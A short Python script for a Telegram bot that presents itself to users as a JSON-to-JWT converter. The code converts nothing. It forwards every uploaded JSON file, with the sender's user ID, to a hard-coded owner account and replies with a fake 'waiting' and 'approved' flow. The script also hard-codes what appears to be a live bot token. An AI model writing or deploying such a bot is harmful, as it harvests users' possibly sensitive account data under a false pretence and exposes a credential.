import json
from telegram import Update, Document
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ====== CONFIG ======
BOT_TOKEN = "8343144047:AAGtkdgoxWh22Qza4rvW-nYu3rAy3i27WL0"
OWNER_ID = 6267722480   # <-- Apna Telegram numeric ID daalo

# ====== START CMD ======
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📁 Send your JSON file.\n\nBot canvart to jwt...\nPlease wait 30sec after sending."
    )

# ====== JSON RECEIVE ======
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc: Document = update.message.document

    # Check file type
    if not doc.file_name.endswith(".json"):
        await update.message.reply_text("❌ Please send a JSON file only.")
        return

    file = await doc.get_file()
    path = f"{doc.file_name}"
    await file.download_to_drive(path)

    # Try loading JSON
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)

        # JSON valid → send to owner
        caption = (
            f"📥 New JSON Received\n"
            f"👤 User ID: {update.effective_user.id}\n\n"
            f"Check and allow."
        )

        await context.bot.send_document(
            chat_id=OWNER_ID,
            document=open(path, "rb"),
            caption=caption
        )

        await update.message.reply_text("⏳ waiting.......")

    except Exception as e:
        await update.message.reply_text("❌ Invalid JSON file.")

# ====== OWNER ALLOW CMD ======
async def allow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return

    try:
        user_id = int(context.args[0])

        await context.bot.send_message(
            chat_id=user_id,
            text="✅ Your JSON Approved & Allowed."
        )

        await update.message.reply_text("✔️ Allowed successfully.")

    except:
        await update.message.reply_text("Usage: /allow USER_ID")

# ====== MAIN ======
app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("allow", allow))
app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

print("Bot Running...")
app.run_polling()